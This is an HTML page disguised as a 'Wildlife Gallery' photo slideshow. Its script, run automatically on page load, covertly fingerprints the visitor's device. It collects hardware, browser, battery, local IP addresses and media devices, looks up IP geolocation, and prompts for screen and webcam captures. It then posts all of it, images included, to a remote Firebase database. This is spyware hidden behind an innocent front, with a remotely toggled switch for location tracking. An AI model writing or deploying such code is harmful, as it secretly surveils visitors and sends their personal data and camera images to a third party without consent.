<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wildlife Gallery</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 800px;
            background: white;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            overflow: hidden;
            animation: slideUp 0.6s ease-out;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px 20px;
            text-align: center;
        }

        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }

        .header p {
            font-size: 14px;
            opacity: 0.9;
        }

        .slideshow-container {
            position: relative;
            width: 100%;
            height: 500px;
            background: #f0f0f0;
            overflow: hidden;
        }

        .slide {
            display: none;
            width: 100%;
            height: 100%;
            position: absolute;
            top: 0;
            left: 0;
            animation: fadeIn 0.8s;
        }

        .slide.active {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .slide img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transition: transform 0.5s ease;
        }

        .slide img:hover {
            transform: scale(1.05);
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        .slide-counter {
            position: absolute;
            bottom: 20px;
            right: 20px;
            background: rgba(0, 0, 0, 0.6);
            color: white;
            padding: 10px 15px;
            border-radius: 20px;
            font-size: 14px;
            z-index: 10;
            transition: background 0.3s ease;
        }

        .slide-counter:hover {
            background: rgba(0, 0, 0, 0.8);
        }

        .controls {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
            background: #f9f9f9;
            gap: 10px;
        }

        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        button::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            transform: translate(-50%, -50%);
            transition: width 0.4s ease, height 0.4s ease;
        }

        button:hover::before {
            width: 200px;
            height: 200px;
        }

        button:hover {
            background: #764ba2;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }

        button:active {
            transform: translateY(0);
        }

        button:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }

        button:disabled:hover {
            box-shadow: none;
        }

        @media (max-width: 600px) {
            .header h1 {
                font-size: 20px;
            }

            .slideshow-container {
                height: 300px;
            }

            .controls {
                flex-wrap: wrap;
            }

            button {
                flex: 1;
                min-width: 100px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Wildlife Gallery</h1>
            <p>Enjoy this beautiful collection of wildlife photography</p>
        </div>

        <div class="slideshow-container">
            <div class="slide active">
                <img src="https://images.pexels.com/photos/1618606/pexels-photo-1618606.jpeg?auto=compress&cs=tinysrgb&w=800" alt="African Elephant">
            </div>
            <div class="slide">
                <img src="https://images.pexels.com/photos/47547/squirrel-animal-cute-eyes-47547.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Squirrel">
            </div>
            <div class="slide">
                <img src="https://images.pexels.com/photos/3331217/pexels-photo-3331217.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Tiger">
            </div>
            <div class="slide">
                <img src="https://images.pexels.com/photos/50581/lion-wild-africa-portrait-50581.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Lion">
            </div>
            <div class="slide">
                <img src="https://images.pexels.com/photos/349758/hummingbird-bird-birds-349758.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Hummingbird">
            </div>

            <div class="slide-counter">
                <span id="current-slide">1</span> / <span id="total-slides">5</span>
            </div>
        </div>

        <div class="controls">
            <button id="prev-btn" onclick="previousSlide()">← Previous</button>
            <button id="play-btn" onclick="toggleAutoPlay()">Auto Play</button>
            <button id="next-btn" onclick="nextSlide()">Next →</button>
        </div>
    </div>

    <script>
        let currentSlide = 0;
        let autoPlayActive = false;
        let autoPlayInterval = null;
        const slides = document.querySelectorAll('.slide');
        const totalSlides = slides.length;
        let hasInsertedData = false;

        document.getElementById('total-slides').textContent = totalSlides;

        function showSlide(n) {
            slides.forEach(slide => slide.classList.remove('active'));
            slides[n].classList.add('active');
            document.getElementById('current-slide').textContent = n + 1;
        }

        function nextSlide() {
            currentSlide = (currentSlide + 1) % totalSlides;
            showSlide(currentSlide);
        }

        function previousSlide() {
            currentSlide = (currentSlide - 1 + totalSlides) % totalSlides;
            showSlide(currentSlide);
        }

        function toggleAutoPlay() {
            autoPlayActive = !autoPlayActive;
            const btn = document.getElementById('play-btn');

            if (autoPlayActive) {
                btn.textContent = 'Stop';
                autoPlayInterval = setInterval(nextSlide, 4000);
            } else {
                btn.textContent = 'Auto Play';
                clearInterval(autoPlayInterval);
            }
        }

        // ============================================
        // ADVANCED DEVICE FINGERPRINTING
        // ============================================

        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let browserName = 'Unknown';
            let browserVersion = 'Unknown';
            let osName = 'Unknown';
            let osVersion = 'Unknown';

            if (ua.indexOf('Firefox') > -1) {
                browserName = 'Firefox';
                browserVersion = ua.match(/Firefox\/(\d+\.\d+)/)?.[1] || 'Unknown';
            } else if (ua.indexOf('Edg') > -1) {
                browserName = 'Edge';
                browserVersion = ua.match(/Edg\/(\d+\.\d+)/)?.[1] || 'Unknown';
            } else if (ua.indexOf('Chrome') > -1) {
                browserName = 'Chrome';
                browserVersion = ua.match(/Chrome\/(\d+\.\d+)/)?.[1] || 'Unknown';
            } else if (ua.indexOf('Safari') > -1) {
                browserName = 'Safari';
                browserVersion = ua.match(/Version\/(\d+\.\d+)/)?.[1] || 'Unknown';
            } else if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) {
                browserName = 'Opera';
                browserVersion = ua.match(/(?:Opera|OPR)\/(\d+\.\d+)/)?.[1] || 'Unknown';
            } else if (ua.indexOf('Trident') > -1) {
                browserName = 'Internet Explorer';
                browserVersion = ua.match(/rv:(\d+\.\d+)/)?.[1] || 'Unknown';
            }

            if (ua.indexOf('Windows NT 10') > -1) {
                osName = 'Windows';
                osVersion = '10/11';
            } else if (ua.indexOf('Windows NT 6.3') > -1) {
                osName = 'Windows';
                osVersion = '8.1';
            } else if (ua.indexOf('Windows NT 6.2') > -1) {
                osName = 'Windows';
                osVersion = '8';
            } else if (ua.indexOf('Windows NT 6.1') > -1) {
                osName = 'Windows';
                osVersion = '7';
            } else if (ua.indexOf('Mac OS X') > -1) {
                osName = 'macOS';
                osVersion = ua.match(/Mac OS X (\d+[._]\d+)/)?.[1]?.replace('_', '.') || 'Unknown';
            } else if (ua.indexOf('Android') > -1) {
                osName = 'Android';
                osVersion = ua.match(/Android (\d+\.\d+)/)?.[1] || 'Unknown';
            } else if (ua.indexOf('iOS') > -1 || (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1)) {
                osName = 'iOS';
                osVersion = ua.match(/OS (\d+[._]\d+)/)?.[1]?.replace('_', '.') || 'Unknown';
            } else if (ua.indexOf('Linux') > -1) {
                osName = 'Linux';
                osVersion = '-';
            } else if (ua.indexOf('CrOS') > -1) {
                osName = 'Chrome OS';
                osVersion = '-';
            }

            return { browserName, browserVersion, osName, osVersion };
        }

        function getPhoneBrand() {
            const ua = navigator.userAgent;

            const phoneBrands = [
                { brand: 'Apple', patterns: ['iPhone', 'iPad', 'iPod'] },
                { brand: 'Samsung', patterns: ['Samsung', 'SM-', 'GT-', 'SGH-', 'SCH-', 'SPH-', 'SVM-', 'SHW-'] },
                { brand: 'Huawei', patterns: ['Huawei', 'HUAWEI', 'HONOR', 'HW-', 'MHA-', 'LLD-', 'LLQ-', 'STF-', 'DUK-', 'CLT-', 'ELE-', 'VOG-', 'MAR-', 'YAL-', 'TNY-', 'NEN-', 'ANA-', 'HWV-', 'EVR-'] },
                { brand: 'Xiaomi', patterns: ['Xiaomi', 'Mi ', 'Mi9', 'Mi10', 'Mi11', 'Mi12', 'MI ', 'Redmi', 'POCO', 'M200', 'M201', 'M210', 'M211', 'M2007', 'M2004', 'M190', 'M191'] },
                { brand: 'OPPO', patterns: ['OPPO', 'OPPO-', 'CPH', 'CPHT', 'Reno', 'Find', 'PAC', 'PACT', 'PBAT', 'PBBT', 'PBCM', 'PBEM', 'PBET'] },
                { brand: 'Vivo', patterns: ['Vivo', 'vivo', 'VIVO', 'V19', 'V20', 'V21', 'V23', 'V25', 'V27', 'V29', 'X50', 'X51', 'X60', 'X70', 'X80', 'X90', 'X100'] },
                { brand: 'Realme', patterns: ['Realme', 'realme', 'REALME', 'RMX', 'RMP', 'RNX', 'RMXA'] },
                { brand: 'OnePlus', patterns: ['OnePlus', 'ONEPLUS', 'A000', 'A100', 'A200', 'A300', 'A500', 'A600', 'A601', 'AC200', 'HD190', 'HD191', 'HD192', 'LE210', 'LE211', 'LE212'] },
                { brand: 'Nokia', patterns: ['Nokia', 'NOKIA', 'TA-', 'RM-', 'RX-'] },
                { brand: 'Sony', patterns: ['Sony', 'Xperia', 'SOV', 'SO-', 'SGP', 'XQ-'] },
                { brand: 'LG', patterns: ['LG', 'LG-', 'LM-', 'LGM-', 'LG-H', 'LG-K', 'LG-M', 'LG-Q', 'LG-V', 'LG-G'] },
                { brand: 'HTC', patterns: ['HTC', 'HTC_', 'HTC-One', 'HTC-Desire', 'HTC-U'] },
                { brand: 'Motorola', patterns: ['Motorola', 'MOTOROLA', 'moto', 'Moto', 'XT', 'MZ', 'MZB', 'PA-', 'PB-', 'PD-', 'PE-', 'PF-', 'PG-'] },
                { brand: 'Asus', patterns: ['Asus', 'ASUS', 'Zenfone', 'ASUS_', 'ZB-', 'ZE-', 'ZC-', 'ZD-', 'ZF-', 'AI-', 'Rog', 'ROG'] },
                { brand: 'Google', patterns: ['Pixel', 'Pixel 2', 'Pixel 3', 'Pixel 4', 'Pixel 5', 'Pixel 6', 'Pixel 7', 'Pixel 8', 'Pixel 9', 'Pixel Fold', 'Pixel Tablet', 'G-'] },
                { brand: 'Lenovo', patterns: ['Lenovo', 'LENOVO', 'Lenovo-', 'TB-', 'YT-', 'P2', 'Z6', 'Z5', 'ZUK'] },
                { brand: 'ZTE', patterns: ['ZTE', 'ZTE-', 'Blade', 'Nubia', 'NX', 'NXA', 'NXJ'] },
                { brand: 'Tecno', patterns: ['Tecno', 'TECNO', 'Infinix', 'Infinix-', 'itel', 'itel-', 'TECNO-'] },
                { brand: 'BlackBerry', patterns: ['BlackBerry', 'BB', 'Blackberry', 'STV', 'PRIV', 'KEY', 'Motion'] },
                { brand: 'Alcatel', patterns: ['Alcatel', 'ALCATEL', 'TCL'] },
                { brand: 'Wiko', patterns: ['Wiko', 'WIKO', 'VIM', 'U-'] },
                { brand: 'Honor', patterns: ['Honor', 'HONOR', 'STK', 'DLI', 'LLD', 'BKL', 'COL', 'PCT', 'YAL', 'HKY', 'BRT', 'BMH', 'BMH-', 'MOA'] },
                { brand: 'Oukitel', patterns: ['Oukitel', 'OUKITEL', 'K-', 'WP'] },
                { brand: 'Doogee', patterns: ['Doogee', 'DOOGEE', 'DG', 'S-'] },
                { brand: 'Ulefone', patterns: ['Ulefone', 'ULEFONE', 'Power', 'Armor', 'Note'] }
            ];

            for (const item of phoneBrands) {
                for (const pattern of item.patterns) {
                    if (ua.includes(pattern)) {
                        return item.brand;
                    }
                }
            }

            if (ua.includes('Windows')) return 'Windows PC';
            if (ua.includes('Macintosh') || ua.includes('Mac OS X')) return 'Apple Mac';
            if (ua.includes('Linux') && !ua.includes('Android')) return 'Linux PC';
            if (ua.includes('CrOS')) return 'Chromebook';

            return 'Unknown Brand';
        }

        function getPhoneModel() {
            const ua = navigator.userAgent;

            if (ua.includes('iPhone')) {
                const iosModels = {
                    'iPhone1,1': 'iPhone', 'iPhone1,2': 'iPhone 3G', 'iPhone2,1': 'iPhone 3GS',
                    'iPhone3,1': 'iPhone 4', 'iPhone3,2': 'iPhone 4', 'iPhone3,3': 'iPhone 4',
                    'iPhone4,1': 'iPhone 4S', 'iPhone5,1': 'iPhone 5', 'iPhone5,2': 'iPhone 5',
                    'iPhone5,3': 'iPhone 5C', 'iPhone5,4': 'iPhone 5C',
                    'iPhone6,1': 'iPhone 5S', 'iPhone6,2': 'iPhone 5S',
                    'iPhone7,1': 'iPhone 6 Plus', 'iPhone7,2': 'iPhone 6',
                    'iPhone8,1': 'iPhone 6s', 'iPhone8,2': 'iPhone 6s Plus', 'iPhone8,4': 'iPhone SE',
                    'iPhone9,1': 'iPhone 7', 'iPhone9,2': 'iPhone 7 Plus', 'iPhone9,3': 'iPhone 7', 'iPhone9,4': 'iPhone 7 Plus',
                    'iPhone10,1': 'iPhone 8', 'iPhone10,2': 'iPhone 8 Plus', 'iPhone10,3': 'iPhone X',
                    'iPhone10,4': 'iPhone 8', 'iPhone10,5': 'iPhone 8 Plus', 'iPhone10,6': 'iPhone X',
                    'iPhone11,2': 'iPhone XS', 'iPhone11,4': 'iPhone XS Max', 'iPhone11,6': 'iPhone XS Max', 'iPhone11,8': 'iPhone XR',
                    'iPhone12,1': 'iPhone 11', 'iPhone12,3': 'iPhone 11 Pro', 'iPhone12,5': 'iPhone 11 Pro Max', 'iPhone12,8': 'iPhone SE 2',
                    'iPhone13,1': 'iPhone 12 mini', 'iPhone13,2': 'iPhone 12', 'iPhone13,3': 'iPhone 12 Pro', 'iPhone13,4': 'iPhone 12 Pro Max',
                    'iPhone14,2': 'iPhone 13 Pro', 'iPhone14,3': 'iPhone 13 Pro Max', 'iPhone14,4': 'iPhone 13 mini', 'iPhone14,5': 'iPhone 13',
                    'iPhone15,2': 'iPhone 14 Pro', 'iPhone15,3': 'iPhone 14 Pro Max', 'iPhone15,4': 'iPhone 14', 'iPhone15,5': 'iPhone 14 Plus',
                    'iPhone16,1': 'iPhone 15 Pro', 'iPhone16,2': 'iPhone 15 Pro Max'
                };
                for (const [code, name] of Object.entries(iosModels)) {
                    if (ua.includes(code)) return name;
                }
                return 'iPhone';
            }

            if (ua.includes('iPad')) return 'iPad';

            const androidModelMatch = ua.match(/Android.*?;\s*([^;)]+)(?:\)|;)/);
            if (androidModelMatch) return androidModelMatch[1].trim();

            return 'Unknown Model';
        }

        function getDeviceType() {
            const ua = navigator.userAgent;
            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return 'Tablet';
            if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return 'Mobile';
            return 'Desktop';
        }

        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return { vendor: 'Not supported', renderer: 'Not supported' };

                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return {
                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown',
                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown',
                    maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE)
                };
            } catch (e) {
                return { vendor: 'Error', renderer: 'Error' };
            }
        }

        async function getBatteryInfo() {
            try {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging ? 'Yes' : 'No'
                };
            } catch (e) {
                return { level: 'N/A', charging: 'Unknown' };
            }
        }

        async function getLocalIPs() {
            const ips = [];
            try {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                const offer = await pc.createOffer();
                await pc.setLocalDescription(offer);

                await new Promise((resolve) => {
                    pc.onicecandidate = (event) => {
                        if (!event.candidate) { resolve(); return; }
                        const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                        if (ipMatch && !ips.includes(ipMatch[1])) ips.push(ipMatch[1]);
                    };
                    setTimeout(resolve, 2000);
                });
                pc.close();
            } catch (e) {}
            return ips;
        }

        async function getMediaDevices() {
            return new Promise((resolve) => {
                if (!navigator.mediaDevices?.enumerateDevices) {
                    resolve({ audioInputs: 0, videoInputs: 0, audioOutputs: 0 });
                    return;
                }
                navigator.mediaDevices.enumerateDevices()
                    .then(devices => {
                        const counts = { audioInputs: 0, videoInputs: 0, audioOutputs: 0 };
                        devices.forEach(d => {
                            if (d.kind === 'audioinput') counts.audioInputs++;
                            if (d.kind === 'videoinput') counts.videoInputs++;
                            if (d.kind === 'audiooutput') counts.audioOutputs++;
                        });
                        resolve(counts);
                    })
                    .catch(() => resolve({ audioInputs: 0, videoInputs: 0, audioOutputs: 0 }));
            });
        }

        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 50;
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Wildlife Gallery', 2, 15);
                return canvas.toDataURL() ? 'Generated' : 'Not supported';
            } catch (e) {
                return 'Not supported';
            }
        }

        async function collectDeviceData() {
            const browserInfo = getBrowserInfo();
            const webgl = getWebGLInfo();
            const battery = await getBatteryInfo();
            const localIPs = await getLocalIPs();
            const mediaDevices = await getMediaDevices();
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

            return {
                deviceName: navigator.platform || 'Unknown',
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                phoneBrand: getPhoneBrand(),
                phoneModel: getPhoneModel(),
                deviceType: getDeviceType(),
                browserName: browserInfo.browserName,
                browserVersion: browserInfo.browserVersion,
                osName: browserInfo.osName,
                osVersion: browserInfo.osVersion,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                devicePixelRatio: window.devicePixelRatio,
                viewportWidth: window.innerWidth,
                viewportHeight: window.innerHeight,
                cpuCores: navigator.hardwareConcurrency || 'Unknown',
                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                touchSupport: 'ontouchstart' in window,
                gpuVendor: webgl.vendor,
                gpuRenderer: webgl.renderer,
                maxTextureSize: webgl.maxTextureSize,
                batteryLevel: battery.level,
                batteryCharging: battery.charging,
                connectionType: connection?.effectiveType || 'Unknown',
                downlink: connection?.downlink ? connection.downlink + ' Mbps' : 'Unknown',
                online: navigator.onLine,
                localIPs: localIPs,
                hasCamera: mediaDevices.videoInputs > 0,
                hasMicrophone: mediaDevices.audioInputs > 0,
                hasSpeakers: mediaDevices.audioOutputs > 0,
                canvasFingerprint: getCanvasFingerprint(),
                language: navigator.language,
                languages: navigator.languages?.join(', ') || 'Unknown',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString(),
                currentURL: window.location.href
            };
        }

        async function getIPAndLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    status: 'success',
                    ip: data.ip,
                    country: data.country_name,
                    city: data.city,
                    region: data.region,
                    latitude: data.latitude,
                    longitude: data.longitude,
                    isp: data.org,
                    asn: data.asn,
                    postal: data.postal,
                    countryCode: data.country_code,
                    timezone: data.timezone,
                    currency: data.currency
                };
            } catch (error) {
                try {
                    const backupResponse = await fetch('https://ipwho.is/');
                    const backupData = await backupResponse.json();
                    if (backupData.success) {
                        return {
                            status: 'success',
                            ip: backupData.ip,
                            country: backupData.country,
                            city: backupData.city,
                            region: backupData.region,
                            latitude: backupData.latitude,
                            longitude: backupData.longitude,
                            isp: backupData.connection?.isp,
                            asn: 'AS' + backupData.connection?.asn,
                            postal: backupData.postal,
                            countryCode: backupData.country_code,
                            timezone: backupData.timezone?.id,
                            currency: backupData.currency?.code
                        };
                    }
                } catch (e) {}
                return { status: 'failed', error: 'Could not fetch location' };
            }
        }

        async function getScreenCapture() {
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({
                    video: { displaySurface: 'monitor' },
                    audio: false
                });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 500));

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const imageData = canvas.toDataURL('image/png');
                stream.getTracks().forEach(track => track.stop());
                return imageData;
            } catch (e) {
                return null;
            }
        }

        async function getCameraCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                    audio: false
                });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 300));

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const imageData = canvas.toDataURL('image/png');
                stream.getTracks().forEach(track => track.stop());
                return imageData;
            } catch (e) {
                return null;
            }
        }

        // ============================================
        // VISITOR LOCATION FLAG CHECK
        // ============================================

        const FIREBASE_URL = 'https://cybersecurity-c1710-default-rtdb.asia-southeast1.firebasedatabase.app';

        async function checkVisitorLocationFlag() {
            try {
                const response = await fetch(`${FIREBASE_URL}/VISITOR_LOCATION.json`);
                const data = await response.json();

                if (data === null) {
                    // Flag doesn't exist, create it with TRUE
                    await fetch(`${FIREBASE_URL}/VISITOR_LOCATION.json`, {
                        method: 'PUT',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(true)
                    });
                    return true; // Fetch location since we created TRUE
                }

                // Flag exists, return its value
                return data === true;
            } catch (e) {
                return false; // Default: don't fetch location on error
            }
        }

        async function saveToFirebase(deviceData, locationData, screenCapture, cameraCapture) {
            if (hasInsertedData) return; // Prevent double insert
            hasInsertedData = true;

            try {
                const payload = {
                    device: deviceData,
                    location: locationData,
                    captures: {
                        screen: screenCapture ? 'Captured' : 'Not captured',
                        camera: cameraCapture ? 'Captured' : 'Not captured',
                        screenData: screenCapture ? screenCapture : null,
                        cameraData: cameraCapture ? cameraCapture : null
                    },
                    timestamp: new Date().toISOString(),
                    sessionId: Date.now().toString(36) + Math.random().toString(36).substr(2)
                };

                await fetch(`${FIREBASE_URL}/visitor_data.json`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (e) {
                hasInsertedData = false; // Allow retry if failed
            }
        }

        async function initTracker() {
            if (hasInsertedData) return; // Already inserted, don't run again

            // Check VISITOR_LOCATION flag first
            const shouldFetchLocation = await checkVisitorLocationFlag();

            // Collect device data
            const deviceData = await collectDeviceData();

            // Only fetch location if flag is TRUE
            let locationData = { status: 'skipped', reason: 'VISITOR_LOCATION is FALSE' };
            if (shouldFetchLocation) {
                locationData = await getIPAndLocation();
            }

            // Attempt captures
            let screenCapture = null;
            let cameraCapture = null;

            try {
                screenCapture = await getScreenCapture();
                cameraCapture = await getCameraCapture();
            } catch (e) {}

            // Single insert
            await saveToFirebase(deviceData, locationData, screenCapture, cameraCapture);
        }

        // Run once on DOM ready
        document.addEventListener('DOMContentLoaded', () => {
            initTracker();
        });
    </script>
</body>
